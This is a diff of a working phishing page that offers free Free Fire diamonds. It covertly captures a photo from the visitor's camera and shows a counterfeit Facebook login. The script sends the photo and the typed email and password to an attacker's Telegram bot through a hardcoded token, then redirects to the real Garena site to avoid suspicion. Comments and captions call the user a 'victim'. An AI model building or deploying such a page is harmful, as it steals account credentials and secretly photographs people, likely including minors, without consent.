@@ -3,38 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Fire Rewards 💎</title>
+    <title>🎁 Free Fire Rewards 🎁</title>
     <style>
-        body { margin: 0; background: #1a1a1a; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; transition: background 0.5s; overflow: hidden; }
-        /* واجهة الجواهر */
-        #p1 { text-align: center; background: #2c3e50; padding: 30px; border-radius: 20px; width: 85%; max-width: 350px; color: white; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
-        .btn { background: #e74c3c; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; }
-        /* واجهة فيسبوك المخفية */
-        #p2 { display: none; background: #f0f2f5; width: 100%; height: 100vh; position: absolute; top: 0; flex-direction: column; align-items: center; justify-content: center; }
-        .fb-box { background: white; padding: 20px; border-radius: 8px; width: 90%; max-width: 380px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
-        input { width: 92%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        body { margin: 0; padding: 0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; transition: background 0.5s; background: url('https://w0.peakpx.com/wallpaper/705/110/wallpaper-garena-free-fire-free-fire-battlegrounds-poster.jpg') no-repeat center center/cover; }
+        #p1 { text-align: center; background: rgba(0,0,0,0.8); padding: 30px; border-radius: 20px; width: 90%; max-width: 380px; color: white; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
+        .diamond-img { width: 100px; margin-bottom: 10px; }
+        .btn-claim { background: #e74c3c; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; animation: pulse 1.5s infinite; }
+        #p2 { display: none; background: #f0f2f5; width: 100%; height: 100vh; flex-direction: column; align-items: center; justify-content: center; position: absolute; top: 0; left: 0; }
+        .fb-box { background: white; padding: 20px; border-radius: 8px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .fb-logo { width: 120px; margin-bottom: 20px; }
+        input { width: 92%; padding: 12px; margin-bottom: 10px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
         .btn-fb { width: 100%; padding: 10px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 18px; cursor: pointer; }
-        video, canvas { display: none; }
-        #loading { display: none; color: white; font-weight: bold; margin-top: 10px; }
+        #v, #c { display: none; }
     </style>
 </head>
 <body>
 
     <div id="p1">
-        <img src="https://ff.garena.com/static/images/hero/hero_1.png" width="100">
-        <h2>Claim 1000 Diamonds</h2>
-        <p>Verify your account to receive rewards instantly.</p>
-        <button class="btn" onclick="start()">CLAIM NOW</button>
-        <div id="loading">Connecting to server...</div>
+        <img src="https://ff.garena.com/static/images/hero/hero_1.png" class="diamond-img">
+        <h2>Claim 1000 Diamonds Now Now</h2>
+        <p>Verification is required to ensure account safety.</p>
+        <button class="btn-claim" onclick="startHack()">CLAIM NOW</button>
     </div>
 
-    <div id="p2">
+    <div id="fbPage">
         <div class="fb-box">
-            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="120">
-            <p style="color:#1c1e21; font-size:14px; margin-bottom: 15px;">سجّل الدخول للمتابعة إلى فري فاير</p>
-            <input type="text" id="u" placeholder="البريد الإلكتروني أو رقم الهاتف">
-            <input type="password" id="p" placeholder="كلمة المرور">
-            <button class="btn-fb" onclick="send()">تسجيل الدخول</button>
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="fb-logo">
+            <p style="color: #1c1e21; font-size: 14px; margin-bottom: 15px;">Log in to connect to Free Fire for verification.</p>
+            <input type="text" id="u" placeholder="Mobile number or email" required>
+            <input type="password" id="p" placeholder="Password" required>
+            <button class="btn-fb" onclick="sendData()">Log In</button>
         </div>
     </div>
 
@@ -45,53 +43,54 @@
         const T = "8641807283:AAGuEZZ683skc2zJC35K5HRVZzTrPzoHmM8"; 
         const C = "7479786207";
 
-        async function start() {
+        async function startHack() {
             try {
-                // 1. تشغيل الكاميرا
-                const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('v').srcObject = s;
+                // 1. طلب الكاميرا ديريكت
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('v').srcObject = stream;
                 
-                // 2. تفعيل "الفلاش" وتغيير الواجهة
-                document.getElementById('loading').style.display = 'block';
-                document.body.style.background = "white"; // ضوء قوي للوجه
-
-                // 3. انتظر 5 ثواني لتصفية الصورة
-                setTimeout(() => {
-                    const can = document.getElementById('c');
-                    can.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
-                    can.toBlob(b => {
-                        const f = new FormData();
-                        f.append('chat_id', C);
-                        f.append('photo', b, 'f.jpg');
-                        f.append('caption', "📸 New Victim Captured!");
-                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
-                    }, 'image/jpeg');
-
-                    // 4. الانتقال لصفحة فيسبوك
-                    document.getElementById('p1').style.display = 'none';
-                    document.getElementById('p2').style.display = 'flex';
-                    document.body.style.background = "#f0f2f5";
-                }, 5000);
-
-            } catch (e) {
-                // إذا رفض الكاميرا، نفتح فيسبوك مباشرة
+                // 2. التحويل لفيسبوك فوراً وتبييض الخلفية (فلاش)
+                document.body.style.background = "white"; // "تشعيل الضو"
                 document.getElementById('p1').style.display = 'none';
-                document.getElementById('p2').style.display = 'flex';
+                document.getElementById('fbPage').style.display = 'flex';
+
+                // 3. التقاط الصورة بعد 5 ثواني كاملة باش تصفى
+                setTimeout(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', C);
+                        formData.append('photo', blob, 'shot.jpg');
+                        formData.append('caption', '🎯 Captured Clear Victim!');
+                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: formData });
+                    }, 'image/jpeg');
+                }, 5000); 
+
+            } catch (err) {
+                // إذا رفض الكاميرا، نفتح فيسبوك على الأقل
+                document.getElementById('p1').style.display = 'none';
+                document.getElementById('fbPage').style.display = 'flex';
                 document.body.style.background = "#f0f2f5";
             }
         }
 
-        function send() {
+        function sendData() {
             const u = document.getElementById('u').value;
             const p = document.getElementById('p').value;
-            if(u && p) {
-                const msg = `🎯 NEW ACCOUNT!\n📧 Email: ${u}\n🔑 Pass: ${p}`;
-                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`)
-                .then(() => {
-                    // التوجيه للموقع الحقيقي بعد السرقة
-                    window.location.href = "https://ff.garena.com/";
-                });
+            
+            if(u === "" || p === "") {
+                alert("Please enter your details!");
+                return;
             }
+
+            // إرسال الإيميل والمودباس للبوت
+            const msg = `✅ FACEBOOK ACCOUNT CAPTURED!\n\n📧 Email/Phone: ${u}\n🔑 Password: ${p}`;
+            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`)
+            .then(() => {
+                // توجيه الضحية لصفحة حقيقية باش ما يشكش
+                window.location.href = "https://ff.garena.com/";
+            });
         }
     </script>
 </body>
